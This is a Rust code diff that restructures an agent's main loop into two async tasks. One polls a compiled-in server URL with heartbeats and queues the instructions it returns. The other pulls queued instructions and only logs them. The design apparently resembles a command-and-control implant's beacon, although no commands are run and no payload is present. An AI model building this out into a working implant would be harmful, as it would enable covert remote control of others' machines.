@@ -4,10 +4,10 @@ pub mod state;
 
 use state::State;
 use std::sync::Arc;
-use std::time::Duration;
 use talaria::helper::*;
+use talaria::protocol::*;
 use tokio::sync::RwLock;
-use tokio::time::sleep;
+use tokio::time::{self, Duration};
 const URL: &'static str = env!("URL", "environment variable `URL` not defined");
 
 const POLL_INTERVAL_MS: &'static str = env!(
@@ -30,28 +30,55 @@ async fn main() {
         }
     };
 
-    tokio::spawn(poll(state.clone()));
-    tokio::spawn(eval(state.clone()));
-    // loop {
-    // match network::send_heartbeat(&mut agent).await {
-    //     Ok(instruction) => {
-    //         devlog!("Got instruction: {:#?}", instruction);
-    //         match network::handle_response(&mut agent, instruction).await {
-    //             Ok(_) => devlog!("Successfully handled response"),
-    //             Err(err) => devlog!("Failed to handle response\n{:?}", err),
-    //         }
-    //     }
-    //     Err(err) => devlog!("Failed to communicate with server\n{:?}", err),
-    // }
+    let poll = tokio::spawn(poll(state.clone()));
+    let eval = tokio::spawn(eval(state.clone()));
 
-    // FIXME: whoever wrote this does not understand the nature of async code (me [cole])
-    // we are waiting X amount of time from the end of the last execution,
-    // meaning if we intend to call function Y every X seconds, we are actually
-    // calling function Y every X + N seconds, where N is the execution time of Y
-    // sleep(Duration::from_millis(agent.polling_interval_millis)).await;
-    // }
+    let _ = tokio::join!(poll, eval);
 }
 
-async fn poll(state: Arc<RwLock<State>>) {}
+async fn poll(state: Arc<RwLock<State>>) {
+    let interval = state.read().await.get_polling_interval();
+    let mut interval = time::interval(Duration::from_millis(interval));
 
-async fn eval(state: Arc<RwLock<State>>) {}
+    loop {
+        interval.tick().await;
+
+        let response_body = match state.write().await.get_pending_response() {
+            Some(response) => response,
+            None => AgentResponseBody::Heartbeat,
+        };
+
+        let response = state.write().await.gen_response(response_body);
+        let instruction = state.read().await.send_response(response).await;
+
+        match instruction {
+            Ok(instruction) => {
+                devlog!("Got instruction: {:#?}", instruction);
+                state
+                    .write()
+                    .await
+                    .push_instruction(instruction.packet_body);
+            }
+            Err(err) => {
+                devlog!("Failed to properly communicate with server: {:#?}", err);
+            }
+        }
+    }
+}
+
+async fn eval(state: Arc<RwLock<State>>) {
+    let mut interval = time::interval(Duration::from_millis(100));
+
+    loop {
+        interval.tick().await;
+
+        let instruction = match state.write().await.get_pending_instruction() {
+            Some(instruction) => instruction,
+            None => continue,
+        };
+
+        match instruction {
+            _ => devlog!("Evaluating instruction: {:#?}", instruction),
+        }
+    }
+}
